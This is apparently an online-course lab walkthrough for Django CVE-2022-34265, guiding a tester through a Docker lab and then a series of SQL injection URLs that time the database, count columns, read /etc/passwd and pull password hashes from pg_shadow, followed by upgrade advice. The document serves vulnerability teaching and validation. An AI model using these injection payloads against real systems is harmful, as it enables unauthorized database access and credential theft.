#### What is Django?

According to the [Django project website](https://www.djangoproject.com/), Django is a high-level Python web framework that allows for rapid deployment of web applications, is “reassuringly secure” (more on that later), and is very scalable. As cybersecurity professionals, it’s important to put ourselves in the shoes of developers. That’s why I’d recommend following an [introductory tutorial](https://docs.djangoproject.com/en/4.0/intro/tutorial01/) for writing a web app in Django from the Django project website. This will help you understand the basic structure of Django web apps.

#### What is CVE-2022-34265?

On July 5th, 2022, [Takuto Yoshikai](https://github.com/aeyesec/CVE-2022-34265) from Aeye Security Lab disclosed a vulnerability in Django “due to improper string processing when executing SQL for the arguments of the functions **`Trunc`** and **`Extract`** used for date data in Django. By specifying the request parameters as is in the **`kind`** argument of **`Trunc`** or the **`lookup_name`** argument of **`Extract`**, there is a risk that arbitrary SQL minutes can be executed. By exploiting this vulnerability, a third party can send commands to the database to access unauthorized data or delete the database."

The affected versions are:

- Django 3.2.x prior to 3.2.14
- Django 4.0.x prior to 4.0.6

According to the [Django project website](https://www.djangoproject.com/weblog/2022/jul/04/security-releases/), the issue was given a severity of “high”. Applications that constrain the **`lookup_name`** and **`kind`** choice to a known safe list are unaffected.

To further understand the **`Trunc`** and **`Extract`** functions, you can review the documentation here:

- [Trunc](https://docs.djangoproject.com/en/4.0/ref/models/database-functions/#trunc)
- [Extract](https://docs.djangoproject.com/en/4.0/ref/models/database-functions/#extract)

#### Vulnerability Identification

To verify your current version of Django to see if it's vulnerable, run the following command in a terminal window:

```
python3 -m django --version
```

![Django Image 1 Version](https://images.ctfassets.net/kvf8rpi09wgk/4Mi9pAywZd04kNQRExdqXy/4e2a2e46236a84721f2187e9b0038f76/Django_Image_1_Version.png)

This screenshot is from the vulnerable docker container we will use in the course

#### Lab Scenario: Exploit the Django Vulnerability

You are a penetration tester who works closely with your company’s developers. They use Python Django to write their web applications and ask that you validate CVE-2022-34265. You have found the [GitHub repo](https://github.com/aeyesec/CVE-2022-34265) and must spin up a Docker container to validate the vulnerability.

![Django CVE-2022-34265 (Lab)](https://images.ctfassets.net/kvf8rpi09wgk/3EoFtDcZS3AVl0X2pTF7Q5/b1e709c3decb9491a6a07bef65e98c7e/Django__CVE-2022-34265__Lab.png?w=450)

VIRTUAL LAB

### Django CVE-2022-34265 (Lab)

#### By Infosec Learning

45 minutes

This virtual lab is provided by a third-party partner and will launch in a new browser tab. It may not meet all accessibility standards. Please see our [help center This link opens a new window](https://help.cybrary.it/hc/en-us/articles/1500002668302-Cybrary-s-Commitment-to-Web-Accessibility)for details.

Launch Virtual Lab

#### Lab Instructions

1. Log in to the Kali VM:

- **Username**: kali
- **Password**: cybrary

![Django Image 2 Kali Login](https://images.ctfassets.net/kvf8rpi09wgk/6GmemhqlWn9juMST6VO6Lb/9d26ffbd73d4e366b44e00f67f855972/Django_Image_2_Kali_Login.png)

2. Open a terminal window by right-clicking on the desktop and selecting **Open Terminal Here**. Type **`id`** into the terminal to ensure you are in the Docker group to run docker commands.

![Django Image 3 Docker](https://images.ctfassets.net/kvf8rpi09wgk/4jCNwY1FSHhaYEpxVKACIs/3a81cf0ba1ee1febb92e7d4b1f4d3630/Django_Image_3_Docker.png)

3. You see you are in the Docker group and can run Docker commands. You can also view the images we have downloaded by running the command:

```
docker images
```

![Django Image 4 Repository](https://images.ctfassets.net/kvf8rpi09wgk/2sYsqwJ4vNZNCpdLOzlTMi/e2955be4d6bf0272911dd6b9bb784394/Django_Image_4_Repository.png)

- Notice the Docker image from the [GitHub repo](https://github.com/aeyesec/CVE-2022-34265) is already installed and ready for you to test.

4. Change directories to the CVE-2022-34265 folder by typing:

```
cd ~/Desktop/CVE-2022-34265
```

5. To better understand what Docker containers we’re building, review the contents of the **`docker-compose.yml`** file by entering the command:

```
 cat docker-compose.yml
```

![Django Image 5 Docker 2](https://images.ctfassets.net/kvf8rpi09wgk/ikOyPBjyrCvSOxLMJ9Kk2/e5a64e74b750e06d7ce0d16a1a317d64/Django_Image_5_Docker_2.png)

- If you completed the Django tutorial noted in this lesson intro, then the Python command should look familiar--especially **`python3 manage.py runserver`**. You also see that:
    - Port 8000 is mapped to port 4131, which is how you will connect to the application.
    - A postgres database is created along with username, password, and database name.
    - **Note**: Although this Docker was created to demonstrate this particular CVE, keep in mind that it is **bad security practice** to leave usernames and passwords in Docker files. Security researchers, pentesters, and cybercriminals will often mine GitHub for these credentials.

6. In your terminal, type:

```
docker-compose up -d
```

- **Note**: The **`-d`** flag runs the containers in the background. Otherwise, you would see the output from the container in the terminal window.

![Django Image 6 Docker Done](https://images.ctfassets.net/kvf8rpi09wgk/7ioxplmJAvrbSTJLcJWZyJ/26664a62d86dffb865ecb1972b9f7604/Django_Image_6_Docker_Done.png)

7. To list the containers we created, type:

```
docker ps
```

![Django Image 7 Docker ps](https://images.ctfassets.net/kvf8rpi09wgk/6PKByRvDyHWKsIXSpxb0v7/5660a80340b04ef2fc6824e7c87021c8/Django_Image_7_Docker_ps.png)

8. Using the **`docker inspect`** command allows you to find additional information about the Docker container. To review that information, type:

```
docker inspect cve-2022-34265_postgres_1
```

- You should also be able to see the username, password, and database displayed:

![Django Image 8 Docker Inspect](https://images.ctfassets.net/kvf8rpi09wgk/30sDGIqEkWDUEzGwbNun4m/a4e839b7b818dfbf0be83eb354162cfd/Django_Image_8_Docker_Inspect.png)

- **Note**: Although hacking Docker itself is another topic beyond the scope of this lesson, the above commands should help you understand a bit about how to run, list, and inspect Docker containers.

9. Open a web browser and enter: [http://localhost:4131/extract/?lookup_name=year](http://localhost:4131/extract/?lookup_name=year)

![Django Image 9 lookup name year](https://images.ctfassets.net/kvf8rpi09wgk/4xA7LlU3dm6dV7r2GqWu7Q/8956ef40c0dc93f7d60dec2d14e384f8/Django_Image_9_lookup_name_year.png)

10. Surf to: [http://localhost:4131/trunc/?kind=year](http://localhost:4131/trunc/?kind=year)

![Django Image 10 Res](https://images.ctfassets.net/kvf8rpi09wgk/6a6etCyBZj02Xn4YYblGvt/3579335dd30de53030ff379249344e99/Django_Image_10_Res.png)

11. In another browser tab, open aeysec’s GitHub repo: [https://github.com/aeyesec/CVE-2022-34265](https://github.com/aeyesec/CVE-2022-34265)
    
12. Scroll down to the PoC section: [https://github.com/aeyesec/CVE-2022-34265#poc](https://github.com/aeyesec/CVE-2022-34265#poc)
    
13. You can test the two PoCs in your terminal window. Copy each of the following PoCs from the GitHub tab in the browser into the terminal window, one at a time, and run them one at a time:
    

```
curl 
"http://localhost:4131/extract/?lookup_name=year%27%20FROM%20start_datetime))%20OR%201=1;SELECT%20PG_SLEEP(5)--"
```

```
curl 
"http://localhost:4131/trunc/?kind=year%27,%20start_datetime))%20OR%201=1;SELECT%20PG_SLEEP(5)--"
```

- These PoCs use a **`sleep`** command to cause a 5-second delay in loading the page.
- **Note**: If you try this, it may take more than 5 seconds to load the page. Some strict bug bounty programs or customers may not take this as a legitimate proof of concept, as it takes longer than 5 seconds.

14. As the **`sleep`** command doesn’t display any database information back to you, you want to perform an in-band (or visible) SQL injection to show the dangers of CVE-2022-34265. You must first discover how many columns the database has. You could do this from code review, or blind (using trial and error without access to the code). But in this lab, you will do this back in the browser window.
    
15. As you have a **`SELECT`** statement already in the URI, you can reformat it a bit to add **`NULL`** commands to the end of the **`SELECT`** statement until you do not receive an error message. First, copy the second PoC from GitHub into the address bar of your first browser tab:
    

```
http://localhost:4131/trunc/?kind=year%27,,%20start_datetime))%20OR%201=1;SELECT%20PG_SLEEP(5)--
```

16. Still in the first browser tab, modify the line to remove **`PG_SLEEP(5)`** and add **`NULL`**:

```
http://localhost:4131/trunc/?kind=year%27,%20start_datetime))%20OR%201=1;SELECT%20NULL--
```

17. Hit **Enter**, and the browser will display the following RuntimeError:

![Django Image 11 RuntimeError](https://images.ctfassets.net/kvf8rpi09wgk/3tbzyPkwRb9FlRAkoIrUID/98aede6c2996d41c7d6ded7245a237ad/Django_Image_11_RuntimeError.png)

- **Note**: In the display above and in the rendered page in the lab, the address bar looks different after the page loads. This is because the browser interprets **%27** as a single quote (**‘**) and **%20** as a space.
- So this: `http://localhost:4131/trunc/?kind=year%27,%20start_datetime))%20OR%201=1;SELECT%20NULL--` becomes this: `http://localhost:4131/trunc/?kind=year’, start_datetime)) OR 1=1;SELECT NULL--`

For more information, see the [W3 schools page](https://www.w3schools.com/tags/ref_urlencode.ASP).

18. Now you're going to append **`NULL`** to the end of the **`SELECT`** statement. After entering seven **`NULL`** commands, observe the following valid response instead of a Runtime Error:

```
http://localhost:4131/trunc/?kind=year%27,%20start_datetime))%20OR%201=1;SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL--
```

![Django Image 12 Null](https://images.ctfassets.net/kvf8rpi09wgk/4qOi4jSPG4aroHUFmH7E1s/dcf4ba9d4586772765d4a70150bd614a/Django_Image_12_Null.png)

- **Note**: You are using **`NULL`** because postgres uses a variety of data types like integers and strings. If you use the wrong one--i.e. putting **`a`** instead of **`1`** in your SQL injection--it will fail. **`NULL`** can be used by any data type, and therefore you do not have to worry about the database expecting a string or integer for that particular column.

19. Now that you have found the correct number of columns, you can start extracting information from the database. There are some great websites on postgres SQL injections, such as in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md).
    
20. Try to extract the postgres version by replacing your first **`NULL`** with **`version()`**:
    

```
http://localhost:4131/trunc/?kind=year%27,%20start_datetime))%20OR%201=1;SELECT version(),NULL,NULL,NULL,NULL,NULL,NULL–-
```

![Django Image 13 version](https://images.ctfassets.net/kvf8rpi09wgk/mRhSzwJqILvRcnzfuzpgt/16835127c8df115c9c7445e5ad81445c/Django_Image_13_version.png)

- Observe that you successfully extracted the version of PostgresSQL, along with some other useful information about the environment.

21. Extract the **`/etc/passwd`** file by replacing **`version()`** with **`pg_read_file(‘/etc/passwd’)`**:

```
http://localhost:4131/trunc/?kind=year%27%20start_datetime))%20OR%201=1;SELECT pg_read_file(‘/etc/passwd’),NULL,NULL,NULL,NULL,NULL,NULL–-
```

![Django Image 14 etc passwd](https://images.ctfassets.net/kvf8rpi09wgk/6r2l73im2Xgv3tOhudZk3p/76e92753c0d1baac4ee5f67a483c4e8d/Django_Image_14_etc_passwd.png)

22. Extract the hashed database password by replacing **`pg_read_file(‘/etc/passwd’)`** with **`passwd`** and adding a **`FROM pg_shadow`** to the end of your SQL statement:

```
http://localhost:4131/trunc/?kind=year%27%20start_datetime))%20OR%201=1;SELECT pg_read_file(‘/etc/passwd’),NULL,NULL,NULL,NULL,NULL,NULL FROM pg_shadow–-
```

![Django Image 15 pg shadow](https://images.ctfassets.net/kvf8rpi09wgk/1hTHYJMGFFINyh5T3vSWDP/a1a7af30c5f7c094f8ea70f9875df1f2/Django_Image_15_pg_shadow.png)

- **Note**: Cracking the password is beyond the scope of this course, but recall you already know the database password from reading the YAML file and also using the **`docker inspect`** command.

Armed with the above SQL injection commands, we can now show the greater impact of this CVE to our developers. It's also great that we can do this without relying solely on using a **`sleep`** command--especially showing you are able to extract the password hash.

#### Vulnerability Mitigation

Patches for the vulnerable versions of Django can be found on the Django project website.

It is recommended to update to Django version 3.2.14 or higher, or 4.0.6 or higher.

1. To upgrade Django from the terminal, type:

```
pip3 install django -U 
```

- **Note**: You can also use **`--upgrade`** instead of **`-U`**.

2. Alternatively, you can specify the version of Django by entering:

```
pip3 install django==4.0.6
```

#### Summary

This course covered how to exploit CVE-2022-34265 by using a publicly available GitHub repo containing a Docker image with vulnerable code. You learned to deploy, list, and inspect Docker containers and review the **`docker-compose.yml`** file for any sensitive information. You then built upon the PoC given by the researcher to perform SQL injections on the postgres database and extract information from the database. You also know how to mitigate the vulnerability.